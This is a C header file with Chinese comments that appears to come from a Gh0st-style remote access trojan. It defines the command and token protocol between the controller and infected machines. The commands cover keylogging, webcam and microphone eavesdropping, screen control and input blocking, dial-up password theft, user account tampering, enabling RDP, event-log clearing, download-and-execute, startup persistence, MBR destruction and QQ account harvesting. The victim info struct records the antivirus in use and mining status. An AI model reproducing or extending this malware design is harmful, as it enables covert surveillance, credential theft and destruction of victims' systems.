#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 1,    	// 一般,如果本地或者远程已经有，取消
		TRANSFER_MODE_ADDITION,			// 追加
		TRANSFER_MODE_ADDITION_ALL,		// 全部追加
		TRANSFER_MODE_OVERWRITE,		// 覆盖
		TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
		TRANSFER_MODE_JUMP,				// 覆盖
		TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
		TRANSFER_MODE_CANCEL,			// 取消传送
};
enum
{
	COMMAND_LIST_FILES = 1,			// 列出目录中的文件
		COMMAND_DOWN_FILES,				// 下载文件
		COMMAND_FILE_SIZE,				// 上传时的文件大小
		COMMAND_FILE_DATA,				// 上传时的文件数据
		COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
		COMMAND_STOP,					// 传输中止
		COMMAND_DELETE_FILE,			// 删除文件
		COMMAND_DELETE_DIRECTORY,		// 删除目录
		COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
		COMMAND_CREATE_FOLDER,			// 创建文件夹
		COMMAND_RENAME_FILE,			// 文件或文件改名
		COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
		COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
		COMMAND_FILES_SEARCH_START,     // 搜索文件
		COMMAND_FILES_SEARCH_STOP,      // 停止搜索
		COMMAND_MOVE_DIRECTORY,         // 移动文件夹
		COMMAND_MOVE_FILE,              // 移动文件
		
		
		TOKEN_FILE_LIST,				// 文件列表
		TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
		TOKEN_FILE_DATA,				// 文件数据
		TOKEN_TRANSFER_FINISH,			// 传输完毕
		TOKEN_DELETE_FINISH,			// 删除完毕
		TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
		TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
		TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
		TOKEN_DATA_CONTINUE,			// 继续传输数据
		TOKEN_RENAME_FINISH,			// 改名操作完成
		TOKEN_SEARCH_FILE_LIST,         // 搜索出来的文件
		TOKEN_SEARCH_FILE_FINISH,       // 全部搜索完成
		TOKEN_MOVE_FINISH,
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_SCREEN_RESET = 1,			// 改变屏幕深度
		COMMAND_ALGORITHM_RESET,		// 改变算法
		COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
		COMMAND_SCREEN_CONTROL,			// 屏幕控制
		COMMAND_DISABLE_AERO,           // 禁用AERO特效
		COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
		COMMAND_SCREEN_BLANK,			// 服务端黑屏
		COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
		COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
		COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版
		
		
		TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
		TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
		TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容	
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_PSLIST = 1,					// 进程列表
		COMMAND_WSLIST,					// 窗口列表
		COMMAND_SSLIST,                 // 用户信息
		COMMAND_USLIST,                 // 系统用户
		COMMAND_ASLIST,                 // 用户状态
		COMMAND_DSLIST,                 // 拨号密码
		COMMAND_SOFTWARELIST,           // 软件列表

		COMMAND_KILLPROCESS,			// 关闭进程
		COMMAND_KILLPROCESS_WINDOW,     // 关闭进程(窗口)
		COMMAND_WINDOW_TEST,            // 窗口隐藏、还原、最大化、最小化
		COMMAND_WINDOW_CLOSE,           // 窗口关闭

		COMMAND_ACITVEUSER,             // 启用用户
		COMMAND_DISABLEEUSER,           // 禁用用户
		COMMAND_NET_USER,               // 无net添加用户
		COMMAND_CHANGE_USERPASS,        // 更改用户密码
		COMMAND_DELUSER,                // 删除用户

		COMMAND_DISCONNECTUSER,         // 断开用户
		COMMAND_LOGOFF_USER,            // 注销用户

		COMMAND_3389_PORT,              // 更改3389端口
		COMMAND_OPEN_3389,              // 开启3389
		COMMAND_SEND_TERMSRV,           // 发送双开3389文件

		COMMAND_S_SESSION,              // 会话管理
		
		//
		TOKEN_WSLIST,					// 窗口列表
		TOKEN_SSLIST,                   // 系统信息
		TOKEN_USLIST,                   // 系统用户
		TOKEN_ASLIST,                   // 用户状态
		TOKEN_DIALUPASS,                // 拨号密码
		TOKEN_SOFTWARE,                 // 软件信息

		TOKEN_CPUMEMORY,                // cpu 内存使用率
 		TOKEN_CHANGE_PSAA_SUCCESS,      // 更改用户密码成功
		TOKEN_GET_TERMSRV,              // XP系统获取双开3389文件
		TOKEN_TERMSRV_OK,               // 双开3389成功
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_WEBCAM_RESIZE = 1,    		// 摄像头调整分辩率，后面跟两个INT型的宽高
	TOKEN_WEBCAM_DIB,			    	// 摄像头的图像数据
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_DELETESERVERICE = 100,       // 删除服务
	COMMAND_STARTSERVERICE,              // 启动服务
	COMMAND_STOPSERVERICE,               // 停止服务
	COMMAND_PAUSESERVERICE,              // 暂停服务
	COMMAND_CONTINUESERVERICE,           // 继续服务
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_REG_ENUM = 1,                 // 枚举注册表
		COMMAND_REG_CREATEKEY,            // 创建路径
		COMMAND_REG_DELKEY,               // 删除路径
		COMMAND_REG_CREATKEY,             // 创建键
		COMMAND_REG_DELVAL,               // 删除键
		
		TOKEN_REG_INFO,                   // 注册表信息
		TOKEN_REG_SUCCEED,                // 注册表成功
		TOKEN_REG_ERROR,                  // 注册表出错
		TOKEN_REG_KEY,                    // 键值数据
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_AUDIO_DATE = 1,             // 发送本地语音数据
		COMMAND_AUDIO_CHANGER,          // 更改输入设备
		COMMAND_AUDIO_CHANGER_LINES,    // 更换输入声道
		
		TOKEN_AUDIO_DATA,               // 音频数据
		TOKEN_AUDIO_CHANGE_FINISH,      // 换道成功
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_KEYBOARD_OFFLINE = 1,		// 开启离线键盘记录
		COMMAND_SEND_KEYBOARD,          // 获取键盘记录内容
		COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容
		COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
		TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	CLEAN_EVENT_ALL = 1,
		CLEAN_EVENT_SYS,
		CLEAN_EVENT_SEC,
		CLEAN_EVENT_APP
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_PROXY_CONNECT= 1, //socket5代理
		COMMAND_PROXY_CLOSE,
		COMMAND_PROXY_DATA,

		TOKEN_PROXY_CONNECT_RESULT,
		TOKEN_PROXY_CLOSE,
		TOKEN_PROXY_DATA,
		TOKEN_PROXY_BIND_RESULT
};
//////////////////////////////////////////////////////////////////////////
enum
{
	// 控制端发出的命令

	COMMAND_SESSION = 0,			// 会话管理（关机，重启，注销, 卸载）
	COMMAND_UNINSTALL,              // 卸载
	COMMAND_RENAME_REMARK,          // 更改备注
	COMMAND_CHANGEDLLINFO,          // 查询配置
	COMMAND_CHANGE_GROUP,           // 更改分组
	COMMAND_CLEAN_EVENT,            // 清理日志
		
	// 其他功能
	COMMAND_DOWN_EXEC,              // 下载执行
	COMMAND_DOWN_UPDATE,            // 下载更新
	COMMAND_START,                  	//写入启动
    COMMAND_Screensp,                   //win10半屏
	COMMAND_OPEN_URL_SHOW,          // 打开网页（显示）
	COMMAND_OPEN_URL_HIDE,          // 打开网页（隐藏）
	COMMAND_LOCAL_UPLOAD,           // 本地上传
	COMMAND_MESSAGEBOX,             // Messagebox
		
	// 筛选
	COMMAND_FIND_PROCESS,           // 查找进程
	COMMAND_FIND_WINDOW,            // 查找窗口
	
	COMMAND_OPEN_PROXY,             // 开启代理
	COMMAND_CLOSE_PROXY,            // 关闭代理
 
	COMMAND_PRANK,                  // 恶 作 剧

	// 主要功能
	COMMAND_NEXT = 100,				// 下一步(控制端已经打开对话框)
	COMMAND_LIST_DRIVE,	            // 文件管理(列出磁盘目录) 
	COMMAND_SCREEN_SPY,				// 屏幕监控
	COMMAND_WEBCAM,					// 摄像头监控
	COMMAND_AUDIO,                  // 语音监听
	COMMAND_SHELL,					// cmdshell
	COMMAND_SYSTEM,                 // 系统管理
	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_SERVICE_MANAGER,	    // 服务管理	
	COMMAND_REGEDIT,                // 注 册 表
	COMMAND_TEXT_CHAT,              // 文字聊天
	COMMAND_PROXY_MAP,				// proxy

	
	// 附加功能
	COMMAND_CHAT,
	COMMAND_CHAT_CLOSE,
	COMMAND_KILL_MBR,
	COMMAND_DISCONT,
	COMMAND_GETQQNUM,               //获取QQ
	
	// 预留 
	COMMAND_PLUGINME,
	COMMAND_BUUTO_SYSINFO,			//临时系统信息
/////////////////////////////////////////////////////////////////////////////////////////

	// 服务端发出的标识
	TOKEN_LOGIN = 200,				// 上线包
	TOKEN_DRIVE_LIST,				// 文件管理（驱动器列表）
	TOKEN_BITMAPINFO,				// 屏幕监控（屏幕查看的BITMAPINFO）
	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头（摄像头的BITMAPINFOHEADER）
	TOKEN_SHELL_START,              // CMD
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_PSLIST,					// 进程列表
	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_SERVICE_LIST,             // 服务列表
	TOKEN_REGEDIT,                  // 注册表开始
	TOKEN_TEXTCHAT_START,           // 文字聊天开始
	TOKEN_PROXY_START,              // 代理映射开始

	// 其他
	COMMAND_CLORE,					//颜色	
	TOKEN_FIND_YES,                 // 查找存在
	TOKEN_DLLINFO,                  // 查看配置
	TOKEN_TEMP_SYSINFOLIST,
	TOKEN_CHAT_START,
	TOKEN_GETQQNUM,
	// 预留
};

typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// 上线分组
	IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwMajorVer;		// 系统主版本
	DWORD			dwMinorVer;		// 系统次版本
	DWORD			dwBuildNumber;	// 系统Build版本
	char			CPUClockMhz[20];// CPU信息
	DWORD			dwSpeed;		// 网速
	UINT			bIsWebCam;		// 是否有摄像头
	UINT			Mining;
	bool            bIsWow64;
	DWORD           dwMemSize;
	char            szInstallTime[50];
	char			lpColor[20];     //颜色

	////////
	char			Virus[80];		// 杀毒软件
	char			szGraphics[128];	//显卡
	DWORD			Memory7;			//显存
	BOOL			bIsActive;	    // 用户状态
	char			szLionPass[20];
	/////////
}LOGININFO;


//信息列表结构体
struct tagSystemInfo
{
	char szCpuInfo[50];   //CPU信息
	char szActiveTime[100]; //活动时间
	char szAntiVirus[50]; //杀毒软件
	char szUserName[50];   //当前用户名
	char szPcName[50];  //计算机名
	char szRemotePort[10]; //远程端口
	DWORD szMemory;         //内存大小 
	DWORD szMemoryFree;     //可用内存 
	DWORD szDriveSize;      //硬盘大小
	DWORD szDriveFreeSize;  //可用硬盘大小
	char szOpenInfo[50];	// 是否双开(是否开启)
	char szDLLPath[MAX_PATH];    // 服务端路径
	char szScrxy[20];
};


#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)